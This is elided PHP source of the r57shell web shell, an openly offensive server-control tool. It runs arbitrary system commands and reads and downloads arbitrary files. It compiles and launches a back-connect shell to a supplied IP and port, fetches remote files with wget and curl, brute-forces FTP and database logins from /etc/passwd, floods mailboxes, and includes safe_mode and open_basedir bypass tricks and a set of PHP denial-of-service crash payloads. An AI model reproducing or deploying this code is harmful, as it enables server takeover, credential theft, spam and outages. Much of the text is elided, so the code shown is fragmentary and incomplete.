...
if ((!@function_exists('ini_get')) || (null != @ini_get('open_basedir')) || (null != @ini_get('safe_mode_include_dir'))) {
    $open_basedir = 1;
} else {
    $open_basedir = 0;
}
...
} function compress(&$filename, &$filedump, $compress)
{
    ...
    global $mime_type;
    if ('bzip' == $compress && @function_exists('bzcompress')) {
        $filename .= '.bz2';
        $mime_type = 'application/x-bzip2';
        $filedump = bzcompress($filedump);
    } elseif ('gzip' == $compress && @function_exists('gzencode')) {
        $filename .= '.gz';
        $content_encoding = 'x-gzip';
        $mime_type = 'application/x-gzip';
        $filedump = gzencode($filedump);
    } elseif ('zip' == $compress && @function_exists('gzcompress')) {
        $filename .= '.zip';
...
} class my_sql
{
    ...
    public function connect()
    {
        switch ($this->db) { case 'MySQL': if (empty($this->port)) {
            ...
            return 0;
        } $this->connection = @mysql_connect($this->host . ':' . $this->port, $this->user, $this->pass); if (is_resource($this->connection)) {
            return 1;
        } break; case 'MSSQL': if (empty($this->port)) {
            $this->port = '1433';
        } if (!@function_exists('mssql_connect')) {
            return 0;
        } $this->connection = @mssql_connect($this->host . ',' . $this->port, $this->user, $this->pass); if ($this->connection) {
            return 1;
        } break; case 'PostgreSQL': if (empty($this->port)) {
            $this->port = '5432';
        } $str = "host='" . $this->host . "' port='" . $this->port . "' user='" . $this->user . "' password='" . $this->pass . "' dbname='" . $this->base . "'"; if (!@function_exists('pg_connect')) {
            return 0;
        } $this->connection = @pg_connect($str); if (is_resource($this->connection)) {
            return 1;
        } break; case 'Oracle': if (!@function_exists('ocilogon')) {
            return 0;
        } $this->connection = @ocilogon($this->user, $this->pass, $this->base); if (is_resource($this->connection)) {
            return 1;
        } break; }
    ...
    {
        switch ($this->db) { case 'MySQL': if (@mysql_select_db($this->base, $this->connection)) {
            return 1;
        } break; case 'MSSQL': if (@mssql_select_db($this->base, $this->connection)) {
            return 1;
        } break; case 'PostgreSQL': return 1; break; case 'Oracle': return 1; break; }
    ...
    {
        $this->res = $this->error = '';
        switch ($this->db) { case 'MySQL': if (false === ($this->res = @mysql_query('/*' . chr(0) . '*/' . $query, $this->connection))) {
...
return 2; break; case 'MSSQL': if (false === ($this->res = @mssql_query($query, $this->connection))) {
    ...
    return 0;
} elseif (@mssql_num_rows($this->res) > 0) {
    return 1;
}
...
return 2; break; case 'Oracle': if (false === ($this->res = @ociparse($this->connection, $query))) {
    ...
    public function get_result()
    {
        ...
        switch ($this->db) { case 'MySQL': $this->num_rows = @mysql_num_rows($this->res); $this->num_fields = @mysql_num_fields($this->res); while (false !== ($this->rows[] = @mysql_fetch_assoc($this->res))); @mysql_free_result($this->res); if ($this->num_rows) {
            ...
            return 1;
        } break; case 'Oracle': $this->num_fields = @ocinumcols($this->res); while (false !== ($this->rows[] = @oci_fetch_assoc($this->res))) {
            ++$this->num_rows;
        } @ocifreestatement($this->res); if ($this->num_rows) {
            $this->columns = @array_keys($this->rows[0]);
    ...
    public function dump($table)
    {
        ...
        $this->dump[5] = '## --------------------------------------- ';
        switch ($this->db) { case 'MySQL': $this->dump[0] = '## MySQL dump'; if (1 != $this->query('/*' . chr(0) . '*/ SHOW CREATE TABLE `' . $table . '`')) {
            return 0;
        } if (!$this->get_result()) {
            return 0;
        } $this->dump[] = $this->rows[0]['Create Table']; $this->dump[] = '## --------------------------------------- '; if (1 != $this->query('/*' . chr(0) . '*/ SELECT * FROM `' . $table . '`')) {
            return 0;
        } if (!$this->get_result()) {
            return 0;
        ...
        } break; case 'MSSQL': $this->dump[0] = '## MSSQL dump'; if (1 != $this->query('SELECT * FROM ' . $table)) {
            return 0;
        } if (!$this->get_result()) {
            return 0;
        } for ($i = 0; $i < $this->num_rows; ++$i) {
            ...
            $this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(', ', $this->columns) . ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
        } break; case 'PostgreSQL': $this->dump[0] = '## PostgreSQL dump'; if (1 != $this->query('SELECT * FROM ' . $table)) {
            return 0;
        } if (!$this->get_result()) {
            return 0;
        } for ($i = 0; $i < $this->num_rows; ++$i) {
    ...
    {
        switch ($this->db) { case 'MySQL': @mysql_close($this->connection); break; case 'MSSQL': @mssql_close($this->connection); break; case 'PostgreSQL': @pg_close($this->connection); break; case 'Oracle': @oci_close($this->connection); break; }
    }

    public function affected_rows()
    {
        switch ($this->db) { case 'MySQL': return @mysql_affected_rows($this->res); break; case 'MSSQL': return @mssql_affected_rows($this->res); break; case 'PostgreSQL': return @pg_affected_rows($this->res); break; case 'Oracle': return @ocirowcount($this->res); break; default: return 0; break; }
    }
} if (!empty($_POST['cmd']) && 'download_file' == $_POST['cmd'] && !empty($_POST['d_name'])) {
    if ($file = @fopen($_POST['d_name'], 'r')) {
        $filedump = @fread($file, @filesize($_POST['d_name']));
        @fclose($file);
    } elseif ($file = readzlib($_POST['d_name'])) {
        $filedump = $file;
    } else {
        err(1, $_POST['d_name']);
        $_POST['cmd'] = '';
    ...
    die();
} if (!empty($_POST['cmd']) && 'db_query' == $_POST['cmd']) {
    echo $head;
    $sql = new my_sql();
    $sql->db = $_POST['db'];
        ...
        if (!empty($sql->base) && !$sql->select_db()) {
            ...
            foreach ($querys as $num => $query) {
                if (strlen($query) > 5) {
                    ...
                    switch ($sql->query($query)) { case '0': echo '<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>' . $sql->error . '</b></font></td></tr></table>'; break; case '1': if ($sql->get_result()) {
...
} if (!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && 'search_text' == $_POST['cmd']) {
    echo $head;
    ...
    echo '<br><div align=center><font face=Verdana size=-2><b>[ <a href=' . $_SERVER['PHP_SELF'] . '>BACK</a> ]</b></font></div>';
    die();
} if (!$safe_mode && 3 != strpos(ex('echo abcr57'), 'r57')) {
    $safe_mode = 1;
} $SERVER_SOFTWARE = getenv('SERVER_SOFTWARE'); if (empty($SERVER_SOFTWARE)) {
    $SERVER_SOFTWARE = '-';
} function ws($i)
{
    return @str_repeat('&nbsp;', $i);
} function ex($cfe)
{
    ...
    if (!empty($cfe)) {
        if (@function_exists('exec')) {
            ...
            @pclose($f);
        } elseif (@is_resource($f = @proc_open($cfe, [1 => ['pipe', 'w']], $pipes))) {
            $res = '';
            if (@function_exists('fread') && @function_exists('feof')) {
                while (!@feof($pipes[1])) {
...
class SearchResult
{
    ...
    public function __construct($dir, $text, $filter = '')
    {
        $dirs = @explode(';', $dir);
        $this->FilesToSearch = [];
    ...
    public function GetFileMatchesCount()
    {
    ...
    public function SearchText($phrase = 0, $case = 0)
    {
...
9yIHJldHVybiAwOwokY3VyID0gc2VsZWN0KCRfWzBdKTsgIAokfCA9IDE7CnNlbGVjdCgkY3VyKTsKcmV0dXJuIDE7Cn0='; if ($unix) {
...
} echo ' Server IP: [<a href=' . gethostbyname($_SERVER['HTTP_HOST']) . ' target=iframe><font color=blue>' . gethostbyname($_SERVER['HTTP_HOST']) . '</font></a>]'; echo '<br>'; echo ws(2) . 'PHP version: <b>' . @phpversion() . '</b>'; $curl_on = @function_exists('curl_version'); echo ws(2); echo 'cURL: <b>' . (($curl_on) ? ('<font color=green>ON</font>') : ('<font color=red>Kapali</font>')); echo '</b>' . ws(2); echo 'MySQL: <b>'; $mysql_on = @function_exists('mysql_connect'); if ($mysql_on) {
    echo '<font color=green>ON</font>';
} else {
    echo '<font color=red>Kapali</font>';
} echo '</b>' . ws(2); echo 'MSSQL: <b>'; $mssql_on = @function_exists('mssql_connect'); if ($mssql_on) {
    echo '<font color=green>ON</font>';
} else {
    echo '<font color=red>Kapali</font>';
} echo '</b>' . ws(2); echo 'PostgreSQL: <b>'; $pg_on = @function_exists('pg_connect'); if ($pg_on) {
    echo '<font color=green>ON</font>';
} else {
    echo '<font color=red>Kapali</font>';
} echo '</b>' . ws(2); echo 'Oracle: <b>'; $ora_on = @function_exists('ocilogon'); if ($ora_on) {
    echo '<font color=green>ON</font>';
} else {
    echo '<font color=red>Kapali</font>';
} echo '</b><br>' . ws(2); echo 'Safe_mode: <b>'; echo ($safe_mode) ? ('<font color=green>ON</font>') : ('<font color=red>Kapali</font>'); echo '</b>' . ws(2); echo 'Open_basedir: <b>'; if ($open_basedir) {
...
} echo ws(2) . 'Safe_mode_exec_dir: <b>'; if (@function_exists('ini_get')) {
    ...
    echo '<font color=red>ini_get disable!</font></b>';
} echo ws(2) . 'Safe_mode_include_dir: <b>'; if (@function_exists('ini_get')) {
    ...
    echo '<font color=red>ini_get disable!</font></b>';
} echo '<br>' . ws(2); echo 'Disable functions : <b>'; $df = 'ini_get  disable!'; if ((@function_exists('ini_get')) && ('' == ($df = @ini_get('disable_functions')))) {
    echo '<font color=red>NONE</font></b>';
} else {
    echo "<font color=red>$df</font></b>";
} $free = @diskfreespace($dir); if (!$free) {
    $free = 0;
} $all = @disk_total_space($dir); if (!$all) {
    $all = 0;
} echo '<br>' . ws(2) . 'Free space : <b>' . view_size($free) . '</b> Total space: <b>' . view_size($all) . '</b>'; $ust = ''; if ($unix && !$safe_mode) {
    if (which('gcc')) {
        $ust .= 'gcc,';
    }
    if (which('cc')) {
...
} echo ws(2) . $lb . ' <a href=' . $_SERVER['PHP_SELF'] . '?tmp title="' . $lang[$language . '_text48'] . '"><b>tmp</b></a> ' . $rb; echo ws(2) . $lb . ' <a href=' . $_SERVER['PHP_SELF'] . '?delete title="' . $lang[$language . '_text49'] . '"><b>delete</b></a> ' . $rb; if ($unix && !$safe_mode) {
    echo '<br>' . ws(2) . '</b>';
...
<tr><td align=right width=100>'; echo $font; if ($unix) {
    ...
    echo ws(3) . $dir;
    echo '<br></font>';
} echo '</font>'; echo '</td></tr></table>'; if (!empty($_POST['cmd']) && 'mail' == $_POST['cmd']) {
    $res = mail($_POST['to'], $_POST['subj'], $_POST['text'], 'From: ' . $_POST['from'] . "\r\n");
    err(6 + $res);
    $_POST['cmd'] = '';
} if (!empty($_POST['cmd']) && 'mail_file' == $_POST['cmd'] && !empty($_POST['loc_file'])) {
    if ($file = @fopen($_POST['loc_file'], 'r')) {
        $filedump = @fread($file, @filesize($_POST['loc_file']));
        @fclose($file);
    } elseif ($file = readzlib($_POST['loc_file'])) {
        $filedump = $file;
    } else {
    ...
    if (isset($_POST['cmd'])) {
        ...
        $content_encoding = $mime_type = '';
        compress($filename, $filedump, $_POST['compress']);
        $attach = ['name' => $filename, 'type' => $mime_type, 'content' => $filedump];
        if (empty($_POST['subj'])) {
...
} if (!empty($_POST['cmd']) && 'mail_bomber' == $_POST['cmd'] && !empty($_POST['mail_flood']) && !empty($_POST['mail_size'])) {
    for ($h = 1; $h <= $_POST['mail_flood']; ++$h) {
        $res = mail($_POST['to'], $_POST['subj'], $_POST['text'] . str_repeat(' ', 1024 * $_POST['mail_size']), 'From: ' . $_POST['from'] . "\r\n");
    }
    err(6 + $res);
    $_POST['cmd'] = '';
} if (!empty($_POST['cmd']) && 'find_text' == $_POST['cmd']) {
    $_POST['cmd'] = 'find ' . $_POST['s_dir'] . ' -name \'' . $_POST['s_mask'] . '\' | xargs grep -E \'' . $_POST['s_text'] . '\'';
} if (!empty($_POST['cmd']) && 'ch_' == $_POST['cmd']) {
    switch ($_POST['what']) { case 'own': @chown($_POST['param1'], $_POST['param2']); break; case 'grp': @chgrp($_POST['param1'], $_POST['param2']); break; case 'mod': @chmod($_POST['param1'], intval($_POST['param2'], 8)); break; }
    $_POST['cmd'] = '';
} if (!empty($_POST['cmd']) && 'mk' == $_POST['cmd']) {
    switch ($_POST['what']) { case 'file': if ('create' == $_POST['action']) {
        ...
        if (unlink($_POST['mk_name'])) {
            echo '<table width=100% cellpadding=0 cellspacing=0 bgcolor=#008000><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2><b>' . $lang[$language . '_text63'] . '</b></font></div></td></tr></table>';
        }
        $_POST['cmd'] = '';
    } break; case 'dir': if ('create' == $_POST['action']) {
        ...
        if (@rmdir($_POST['mk_name'])) {
            echo '<table width=100% cellpadding=0 cellspacing=0 bgcolor=#008000><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2><b>' . $lang[$language . '_text64'] . '</b></font></div></td></tr></table>';
        }
        $_POST['cmd'] = '';
    } break; }
} if (!empty($_POST['cmd']) && 'touch' == $_POST['cmd']) {
    ...
    $_POST['cmd'] = '';
} if (!empty($_POST['cmd']) && 'edit_file' == $_POST['cmd'] && !empty($_POST['e_name'])) {
...
} if (!empty($_POST['cmd']) && 'save_file' == $_POST['cmd']) {
...
} if (!empty($_POST['ip']) && !empty($_POST['port']) && ('C' == $_POST['use'])) {
    cf('/tmp/back.c', $back_connect_c);
    $blah = ex('gcc -o /tmp/backc /tmp/back.c');
    @unlink('/tmp/back.c');
    $blah = ex('/tmp/backc ' . $_POST['ip'] . ' ' . $_POST['port'] . ' &');
    $_POST['cmd'] = 'echo "Now script try connect to ' . $_POST['ip'] . ' port ' . $_POST['port'] . ' ..."';
} if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ('Perl' == $_POST['use'])) {
    cf('/tmp/dp', $datapipe_pl);
    $p2 = which('perl');
    $blah = ex($p2 . ' /tmp/dp ' . $_POST['local_port'] . ' ' . $_POST['remote_host'] . ' ' . $_POST['remote_port'] . ' &');
    $_POST['cmd'] = 'ps -aux | grep dp';
} if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ('C' == $_POST['use'])) {
    ...
    switch ($_POST['with']) { case 'fopen': $datafile = @implode('', @file($_POST['rem_file'])); if ($datafile) {
    ...
    } $_POST['cmd'] = ''; break; case 'wget': $_POST['cmd'] = which('wget') . ' ' . $_POST['rem_file'] . ' -O ' . $_POST['loc_file'] . ''; break; case 'fetch': $_POST['cmd'] = which('fetch') . ' -o ' . $_POST['loc_file'] . ' -p ' . $_POST['rem_file'] . ''; break; case 'lynx': $_POST['cmd'] = which('lynx') . ' -source ' . $_POST['rem_file'] . ' > ' . $_POST['loc_file'] . ''; break; case 'links': $_POST['cmd'] = which('links') . ' -source ' . $_POST['rem_file'] . ' > ' . $_POST['loc_file'] . ''; break; case 'GET': $_POST['cmd'] = which('GET') . ' ' . $_POST['rem_file'] . ' > ' . $_POST['loc_file'] . ''; break; case 'curl': $_POST['cmd'] = which('curl') . ' ' . $_POST['rem_file'] . ' -o ' . $_POST['loc_file'] . ''; break; }
} if (!empty($_POST['cmd']) && (('ftp_file_up' == $_POST['cmd']) || ('ftp_file_down' == $_POST['cmd']))) {
    ...
    $_POST['cmd'] = '';
} if (!empty($_POST['cmd']) && (('ftp_brute' == $_POST['cmd']) || ('db_brute' == $_POST['cmd']))) {
    if ('ftp_brute' == $_POST['cmd']) {
        list($ftp_server, $ftp_port) = split(':', $_POST['ftp_server_port']);
        if (empty($ftp_port)) {
            $ftp_port = 21;
        }
        $connection = @ftp_connect($ftp_server, $ftp_port, 10);
    } elseif ('db_brute' == $_POST['cmd']) {
        $connection = 1;
    }
    if (!$connection) {
        err(3);
        $_POST['cmd'] = '';
    } elseif (('passwd' == $_POST['brute_method']) && (!$users = get_users('/etc/passwd'))) {
        ...
        $_POST['cmd'] = '';
    } elseif (('dic' == $_POST['brute_method']) && (!$users = get_users($_POST['dictionary']))) {
...
} echo $table_up3; if (empty($_POST['cmd']) && !$safe_mode && !$open_basedir) {
    $_POST['cmd'] = (!$unix) ? ('dir') : ('ls -lia');
} elseif (empty($_POST['cmd']) && ($safe_mode || $open_basedir)) {
    $_POST['cmd'] = 'safe_dir';
} echo $font . $lang[$language . '_text1'] . ': <b>' . $_POST['cmd'] . '</b></font></td></tr><tr><td><b><div align=center><textarea name=report cols=121 rows=15>'; if ($safe_mode || $open_basedir) {
    switch ($_POST['cmd']) { case 'safe_dir': $d = @dir($dir); if ($d) {
    ...
    } break; case 'test1': $ci = @curl_init('file://' . $_POST['test1_file']); $cf = @curl_exec($ci); echo htmlspecialchars($cf); break; case 'test2': @include $_POST['test2_file']; break; case 'test3': if (empty($_POST['test3_port'])) {
        $_POST['test3_port'] = '3306';
    } $db = @mysql_connect('localhost:' . $_POST['test3_port'], $_POST['test3_ml'], $_POST['test3_mp']); if ($db) {
    ...
    } break; case 'test4': if (empty($_POST['test4_port'])) {
        $_POST['test4_port'] = '1433';
    } $db = @mssql_connect('localhost,' . $_POST['test4_port'], $_POST['test4_ml'], $_POST['test4_mp']); if ($db) {
    ...
    } break; case 'test5': $temp = tempnam($dir, 'fname'); if (@file_exists($temp)) {
        @unlink($temp);
    } $extra = '-C ' . $_POST['test5_file'] . " -X $temp"; @mb_send_mail(null, null, null, null, $extra); $str = moreread($temp); echo htmlspecialchars($str); @unlink($temp); break; case 'test6': $stream = @imap_open('/etc/passwd', '', ''); $dir_list = @imap_list($stream, trim($_POST['test6_file']), '*'); for ($i = 0; $i < count($dir_list); ++$i) {
        echo htmlspecialchars($dir_list[$i]) . "\r\n";
    } @imap_close($stream); break; case 'test7': $stream = @imap_open($_POST['test7_file'], '', ''); $str = @imap_body($stream, 1); echo htmlspecialchars($str); @imap_close($stream); break; case 'test8': $temp = @tempnam($_POST['test8_file2'], 'copytemp'); $str = readzlib($_POST['test8_file1'], $temp); echo htmlspecialchars($str); @unlink($temp); break; case 'test9': @ini_restore('safe_mode'); @ini_restore('open_basedir'); $str = moreread($_POST['test9_file']); echo htmlspecialchars($str); break; case 'test10': @ob_clean(); $error_reporting = @ini_get('error_reporting'); error_reporting(E_ALL ^ E_NOTICE); @ini_set('display_errors', 1); $str = fopen($_POST['test10_file'], 'r'); while (!feof($str)) {
        echo htmlspecialchars(fgets($str));
    } fclose($str); error_reporting($error_reporting); break; case 'test11': @ob_clean(); $temp = 'zip://' . $_POST['test11_file']; $str = moreread($temp); echo htmlspecialchars($str); break; case 'test12': @ob_clean(); $temp = 'compress.bzip2://' . $_POST['test12_file']; $str = moreread($temp); echo htmlspecialchars($str); break; case 'test13': @error_log($_POST['test13_file1'], 3, 'php://../../../../../../../../../../../' . $_POST['test13_file2']); echo $lang[$language . '_text61']; break; case 'test14': @session_save_path($_POST['test14_file2'] . "\0;/tmp"); @session_start(); @$_SESSION[php] = $_POST['test14_file1']; echo $lang[$language . '_text61']; break; case 'test15': @readfile($_POST['test15_file1'], 3, 'php://../../../../../../../../../../../' . $_POST['test15_file2']); echo $lang[$language . '_text61']; break; case 'test16': if (fopen('srpath://../../../../../../../../../../../' . $_POST['test16_file'], 'a')) {
        echo $lang[$language . '_text61'];
    } break; case 'test17_1': @unlink('symlinkread'); @symlink('a/a/a/a/a/a/', 'dummy'); @symlink('dummy/../../../../../../../../../../../' . $_POST['test17_file'], 'symlinkread'); @unlink('dummy'); while (1) {
        @symlink('.', 'dummy');
        @unlink('dummy');
    } break; case 'test17_2': $str = ''; while (strlen($str) < 3) {
        $temp = 'symlinkread';
        $str = moreread($temp);
        if ($str) {
            @ob_clean();
    ...
    } break; case 'test17_3': $dir = $files = []; if (@version_compare(@phpversion(), '5.0.0') >= 0) {
        while (@count($dir) < 3) {
...
} if ((!$safe_mode) && ('php_eval' != $_POST['cmd']) && ('mysql_dump' != $_POST['cmd']) && ('db_query' != $_POST['cmd']) && ('ftp_brute' != $_POST['cmd']) && ('db_brute' != $_POST['cmd'])) {
...
} switch ($_POST['cmd']) { case 'dos1': function a()
{
    a();
}a(); break; case 'dos2': @pack('d4294967297', 2); break; case 'dos3': $a = 'a'; @unserialize(@str_replace('1', 2147483647, @serialize($a))); break; case 'dos4': $t = [1]; while (1) {
    $a[] = &$t;
} break; case 'dos5': @dl('sqlite.so'); $db = new SqliteDatabase('foo'); break; case 'dos6': preg_match('/(.(?!b))*/', @str_repeat('a', 10000)); break; case 'dos7': @str_replace('A', str_repeat('B', 65535), str_repeat('A', 65538)); break; case 'dos8': @shell_exec('killall -11 httpd'); break; case 'dos9': function cx()
{
    @tempnam('/www/', '../../../../../../var/tmp/cx');
    cx();
}cx(); break; case 'dos10': $a = @str_repeat('A', 438013); $b = @str_repeat('B', 951140); @wordwrap($a, 0, $b, 0); break; case 'dos11': @array_fill(1, 123456789, 'Infigo-IS'); break; case 'dos12': @substr_compare('A', 'A', 12345678); break; case 'dos13': @unserialize('a:2147483649:{'); break; case 'dos14': $Data = @str_ireplace("\n", '<br>', $Data); break; case 'dos15': function toUTF($x)
{
    return chr(($x >> 6) + 192) . chr(($x & 63) + 128);
} $str1 = ''; for ($i = 0; $i < 64; ++$i) {
    $str1 .= toUTF(977);
} @htmlentities($str1, ENT_NOQUOTES, 'UTF-8'); break; case 'dos16': $r = @zip_open('x.zip'); $e = @zip_read($r); $x = @zip_entry_open($r, $e); for ($i = 0; $i < 1000; ++$i) {
    $arr[$i] = [['']];
} unset($arr[600]); @zip_entry_read($e, -1); unset($arr[601]); break; case 'dos17': $z = 'UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU'; $y = 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'; $x = 'AQ                                                                        '; unset($z, $y); $x = base64_decode($x); $y = @sqlite_udf_decode_binary($x); unset($x); break; case 'dos18': $MSGKEY = 519052; $msg_id = @msg_get_queue($MSGKEY, 0600); if (!@msg_send($msg_id, 1, 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH', false, true, $msg_err)) {
    ...
    } elseif (('dic' == $_POST['brute_method']) && isset($_POST['ftp_login'])) {
        foreach ($users as $user) {
            $connection = @ftp_connect($ftp_server, $ftp_port, 10);
    ...
    echo "\r\n-------------------------------------\r\n";
    $count = count($users);
    if (isset($_POST['reverse']) && ('passwd' == $_POST['brute_method'])) {
        $count *= 2;
    }
    echo $lang[$language . '_text97'] . $count . "\r\n";
    echo $lang[$language . '_text98'] . $suc . "\r\n";
} if ('db_brute' == $_POST['cmd']) {
    $suc = 0;
    if ('passwd' == $_POST['brute_method']) {
        foreach ($users as $user) {
            $sql = new my_sql();
    ...
    } elseif (('dic' == $_POST['brute_method']) && isset($_POST['mysql_l'])) {
        foreach ($users as $user) {
            $sql = new my_sql();
            $sql->db = $_POST['db'];
            $sql->host = $_POST['db_server'];
    ...
    if (!$sql->connect()) {
        ...
        echo "[-] ERROR! Can't select database";
    } elseif (!$sql->dump($_POST['mysql_tbl'])) {
...
} echo '</textarea></div>'; echo '</b>'; echo '</td></tr></table>'; echo '<table width=100% cellpadding=0 cellspacing=0>'; function div_title($title, $id)
{
    return '<a style="cursor: pointer;" onClick="change_divst(\'' . $id . '\');">' . $title . '</a>';
} function div($id)
{
    if (isset($_COOKIE[$id]) && (0 == $_COOKIE[$id])) {
        return '<div id="' . $id . '" style="display: none;">';
    }
    $divid = ['id5', 'id6', 'id8', 'id9', 'id10', 'id11', 'id16', 'id24', 'id25', 'id26', 'id27', 'id28', 'id29', 'id33', 'id34', 'id35', 'id37', 'id38'];
    ...
    echo $te . '</div>' . $table_end1 . $fe;
} echo $fs . $table_up1 . div_title($lang[$language . '_text42'], 'id3') . $table_up2 . div('id3') . $ts; echo sr(15, '<b>' . $lang[$language . '_text43'] . $arrow . '</b>', in('text', 'e_name', 85, $dir) . in('hidden', 'cmd', 0, 'edit_file') . in('hidden', 'dir', 0, $dir) . ws(4) . in('submit', 'submit', 0, $lang[$language . '_butt11'])); echo $te . '</div>' . $table_end1 . $fe; if ($safe_mode || $open_basedir) {
...
<option value="59">59</option>
    ...
    echo $te . '</div>' . $table_end1 . $fe;
} $select = ''; if (@function_exists('chmod')) {
    ...
    echo $te . '</div>' . $table_end1 . $fe;
} echo $fs . $table_up1 . div_title($lang[$language . '_text32'], 'id10') . $table_up2 . $font; echo '<div align=center>' . div('id10') . '<textarea name=php_eval cols=100 rows=10>'; echo !empty($_POST['php_eval']) ? ($_POST['php_eval']) : ("//unlink(\"r57shell.php\");\r\n//readfile(\"/etc/passwd\");\r\n//file_get_content(\"/etc/passwd\");"); echo '</textarea>'; echo in('hidden', 'dir', 0, $dir) . in('hidden', 'cmd', 0, 'php_eval'); echo '<br>' . ws(1) . in('submit', 'submit', 0, $lang[$language . '_butt1']); echo '</div></div></font>'; echo $table_end1 . $fe; if ($safe_mode || $open_basedir) {
    ...
    echo sr(15, '<b>' . $lang[$language . '_text125'] . $arrow . '</b>', in('text', 'test13_file1', 96, (!empty($_POST['test13_file1']) ? ($_POST['test13_file1']) : ('<?php phpinfo(); ?>'))) . ws(4) . in('submit', 'submit', 0, $lang[$language . '_butt10']));
    echo $te . '</div>' . $table_end1 . $fe;
} if (($safe_mode || $open_basedir) && @version_compare(@phpversion(), '5.2.2') <= 0) {
    ...
    echo sr(15, '<b>' . $lang[$language . '_text125'] . $arrow . '</b>', in('text', 'test14_file1', 96, (!empty($_POST['test14_file1']) ? ($_POST['test14_file1']) : ('<?php phpinfo(); ?>'))) . ws(4) . in('submit', 'submit', 0, $lang[$language . '_butt10']));
    echo $te . '</div>' . $table_end1 . $fe;
    ...
    echo sr(15, '<b>' . $lang[$language . '_text125'] . $arrow . '</b>', in('text', 'test15_file1', 96, (!empty($_POST['test15_file1']) ? ($_POST['test15_file1']) : ('<?php phpinfo(); ?>'))) . ws(4) . in('submit', 'submit', 0, $lang[$language . '_butt10']));
    echo $te . '</div>' . $table_end1 . $fe;
    ...
    echo $te . '</td></tr>';
    echo $te . '</div>' . $table_end1 . $fe;
} $select = ''; if ((!@function_exists('ini_get')) || (@ini_get('allow_url_fopen') && @function_exists('fopen'))) {
    ...
    echo $te . '</div>' . $table_end1 . $fe;
} echo $fs . $table_up1 . div_title($lang[$language . '_text86'], 'id32') . $table_up2 . div('id32') . $ts; echo sr(15, '<b>' . $lang[$language . '_text59'] . $arrow . '</b>', in('text', 'd_name', 85, $dir) . in('hidden', 'cmd', 0, 'download_file') . in('hidden', 'dir', 0, $dir) . ws(4) . in('submit', 'submit', 0, $lang[$language . '_butt14'])); $arh = $lang[$language . '_text92']; if (@function_exists('gzcompress')) {
    $arh .= in('radio', 'compress', 0, 'zip') . ' zip';
} if (@function_exists('gzencode')) {
    $arh .= in('radio', 'compress', 0, 'gzip') . ' gzip';
} if (@function_exists('bzcompress')) {
    $arh .= in('radio', 'compress', 0, 'bzip') . ' bzip';
} echo sr(15, '<b>' . $lang[$language . '_text91'] . $arrow . '</b>', in('radio', 'compress', 0, 'none', 1) . ' ' . $arh); echo $te . '</div>' . $table_end1 . $fe; if (@function_exists('ftp_connect')) {
